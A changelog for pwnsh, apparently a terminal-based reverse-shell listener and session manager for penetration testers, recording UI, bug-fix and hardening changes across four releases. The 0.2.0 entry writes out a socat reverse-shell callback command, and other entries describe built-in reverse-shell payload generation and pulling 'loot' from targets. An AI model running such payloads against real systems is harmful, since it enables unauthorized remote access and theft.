# Changelog

All notable changes to pwnsh are documented in this file.
Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
versioning: [SemVer](https://semver.org/spec/v2.0.0.html).

## [0.4.0] — 2026-06-07

### Changed
- **Renamed the project `multishell` → `pwnsh`.** Package, console command,
  data dir (`~/.multishell/` → `~/.pwnsh/`), classes, banner, and docs all
  move. Existing `~/.multishell/` data is not migrated automatically — copy it
  to `~/.pwnsh/` if you want past sessions to load.
- **Reworked the UI into a framed terminal-style dashboard.** Left pane is a
  framed `SESSIONS` list; the right pane is a single clickable terminal (click
  anywhere in the output and start typing — the prompt is focused by default and
  a click brings focus back to it) whose frame title tracks the live session
  (`#id · label · status`). Below it a framed `TARGET` / `LISTENER` panel carries
  the fingerprint, byte counters, and the listener/debug line, with the most
  recent toast mirrored there so a faded notification is still recoverable. The
  top title bar and the stacked session-header / fingerprint panels are gone, and
  Textual's `Footer` (which surfaced the focused input's own edit keys) is
  replaced by a curated key bar.
- **`Esc` no longer quits the app.** It was far too easy to hit by reflex and
  silently drop every live session. `Esc` now only dismisses modals; quit is
  `Ctrl+Q`.
- **Destructive actions confirm first.** Quitting with live sessions, killing a
  session (`Ctrl+X` / `/kill`), and `/prune` now pop a confirmation that spells
  out that the recorded `.cast` / `.log` evidence will be deleted.

### Fixed
- **Operator hotkeys were shadowed by the focused prompt.** With the command
  input focused by default, Textual's `Input` swallowed `Ctrl+U` (delete-to-
  start) and `Ctrl+K` (delete-to-end) before the app saw them, so the PTY-upgrade
  and command-palette keys silently did nothing while typing. The operator
  bindings are now `priority` so they always fire.
- **Quadratic file-transfer scanning.** The `/get` (and fingerprint / PTY)
  collectors decoded the *entire* growing buffer to a string on every 4 KB read
  — O(n²) over a transfer. New `pwnsh._scan.StreamScanner` searches the raw
  bytes incrementally and decodes only the wanted slice once, so a multi-megabyte
  download is back to milliseconds. Marker detection is also no longer perturbed
  by a multibyte UTF-8 character landing on a chunk boundary.
- **IPv6 / hostname bind pre-check.** The friendly port-in-use check hard-coded
  `AF_INET`, so `-b ::1` / `-b ::` failed. It now resolves the address family
  via `getaddrinfo` and reports unresolvable bind addresses cleanly.
- **Stale `Ctrl+]` references.** Raw-interact's exit key is `Ctrl+G`; the module
  docstring, the in-app help, the operator banner tip, and the README all said
  `Ctrl+]` in places. Corrected throughout.

### Security
- **Reconnect target validation.** `/pty --reconnect host:port` interpolates the
  host into shell + python one-liners. Hosts are now restricted to the character
  set of IP literals / DNS names (`validate_target`), and `callback_pty_payload`
  refuses to build a payload from anything else — no stray quote or shell
  metacharacter can break out of, or be injected into, the payload.
- **`/get` write safety.** A degenerate remote path (`/`, `..`) used to yield an
  empty loot filename and crash the download worker; it now falls back to
  `download-NNNN.bin`. The per-session loot dir is `chmod 700` and each pulled
  file `chmod 600`, matching the session-log policy (loot can contain creds).

### Internal
- Cleaned all `ruff` findings (unused imports, dead locals, import order,
  modern typing) and added tests for the scanner, target validation, the bind
  pre-check, `/get` path safety, and a headless Textual smoke test for the
  mount path and the new quit/confirm behavior. 73 tests, green.

## [0.3.0] — 2026-05-07

### Added
- **`/payload <kind>`** — prints a reverse-shell one-liner pre-stamped with
  the listener's `host:port` directly into the scrollback. Supported kinds:
  `bash`, `sh`, `python`, `nc`, `perl`, `ruby`, `powershell`. Eliminates
  the "wait, what's the bash one again?" moment. New module:
  `src/pwnsh/payloads.py`.
- **Operator banner** in the scrollback when no session is selected:
  ASCII header, listener address, data dir, live/archived counts, key +
  slash cheatsheet. Re-renders whenever the last session is killed.
- **`Esc`** as an alias for quit (alongside `Ctrl+Q`). Modal screens
  continue to use `Esc` for dismiss/cancel.
- **TERM / `NO_COLOR` fallback** — custom theme registration is skipped
  when running on a dumb terminal so a stripped-down SSH session still
  launches cleanly.
- **tmux / screen detection** — when running inside a multiplexer, the
  banner surfaces a tip noting that the pwnsh keys don't collide
  with the mux prefix and that raw-interact (`Ctrl+G`) needs a real tty.
- **Self-bootstrapping `run.sh`** — on a fresh checkout, `./run.sh`
  creates `.venv/`, installs in editable mode, and launches. Designed
  for the "SSH to a fresh box, clone, run inside tmux" flow.
- **Friendly port-in-use error** — pre-flight bind check in
  `__main__.py`. Conflicts now print a one-line hint instead of a
  Textual traceback.

### Fixed
- **Removed sessions resurrected on next startup** — `SessionRegistry.remove()`
  used to drop sessions from memory while leaving `.log`, `.cast`, and
  `.meta.json` files behind, so `load_history()` reloaded them on every
  launch. New `Session.delete_archive()` now unlinks the on-disk artifacts;
  `/kill` and `/prune` actually delete. Regression test added.

### Changed
- README: new "Clone and run" + "Running over SSH / inside tmux or screen"
  sections; clone path updated to `syndis/Monkey-Business`.
- `pyproject.toml`: author email + project URLs updated to Syndis.

## [0.2.0] — 2026-04-25

### Added
- **Raw-interact mode** (`Ctrl+G` or `/raw`) — suspends Textual, drops the
  local tty into `cfmakeraw`, and runs a stdin↔socket bridge so `vim`,
  `htop`, tab completion, shell history, and `Ctrl+C` all work normally
  inside the remote session. Press `Ctrl+G` again to return to the TUI.
  New module: `src/pwnsh/raw_interact.py`.
- **Callback-PTY reconnect** (`/pty --reconnect [host:port]`) — instead
  of wrapping the existing dumb shell in-place, fires a fire-and-forget
  payload (`socat tcp:H:P exec:/bin/bash,pty,stderr,setsid,sigint,sane`,
  with python3/python fallbacks, all detached via `(... &)`) that lands
  as a brand-new session with a clean PTY. New helper:
  `pwnsh.fingerprint.callback_pty_payload()`.
- Two new palette entries: "Reconnect with fresh PTY", "Raw interact (Ctrl+G)".

### Changed
- `pty_upgrade_payload()` is now the *in-place* strategy explicitly;
  `callback_pty_payload()` is the fresh-socket alternative.

## [0.1.0] — 2026-04-24

Initial release.

### Core
- Multi-TCP listener (`asyncio.start_server`) with DoS guard (`MAX_CONCURRENT_SESSIONS`)
- `SessionRegistry` with `on_add` / `on_data` / `on_close` / `on_remove` callbacks
- Per-session scrollback ring buffer (10,000 chunks) preserved across session switches
- Per-session `asyncio.Lock` on `send()` — serialized writes prevent byte-level interleaving

### Textual TUI
- Custom "hacker" theme (registered via `textual.theme.Theme` — cyan/phosphor/amber/hot-pink)
- Sidebar DataTable with session ID / host / OS / status / uptime
- Structured fingerprint info panel (USER / OS / SHELL / CWD / note)
- Integrated prompt row — borderless Input with session-aware prefix (`tag ❯`)
- Command palette (`Ctrl+K`) with 10 static actions + dynamic session switches
- Global regex scrollback search (`Ctrl+F`)
- Rename / tag (`F2` / `Ctrl+T`) and sticky notes (`Ctrl+O`) — both persisted to disk
- Kill session (`Ctrl+X`) + `/prune` for bulk cleanup

### Target interaction
- Auto-fingerprint on connect (OS / user / hostname / shell / cwd, sentinel-delimited probe)
- Bulletproof PTY upgrade: `python3` → `python` → `script` with OS-branched syntax
  (BSD/Darwin vs Linux `script(1)` differ) and post-upgrade sentinel verification
- `/pty [shell]` lets you pick the shell explicitly
- `/put <local> [remote]` — base64 heredoc upload with `sha256` verify, sentinel framing
- `/get <remote>` — base64 stdout download, stored in `~/.pwnsh/loot/session-NNNN/`

### Persistence & evidence
- asciinema v2 `.cast` recording per session (replay with `asciinema play`)
- Raw byte log per session
- Metadata sidecar (`.meta.json`) — tag, note, fingerprint; edits persist across restarts
- `SessionRegistry.load_history()` loads up to 50 most-recent archived sessions on startup
- Archive load capped at 10 MB per log file (prevents OOM on previous big exfils)
- Data directory permissions tightened to `chmod 700`; per-file logs `chmod 600`

### CLI
- `-p / --port`, `-b / --bind`, `--no-history`, `-V / --version`

### Documentation
- `docs/REVERSE_SHELLS.md` — 15-section cheat sheet (bash, nc, python, PHP, Go, PowerShell,
  Flask SSTI, LOLBins, msfvenom, encoding tricks, session stabilization, blue-team signals)
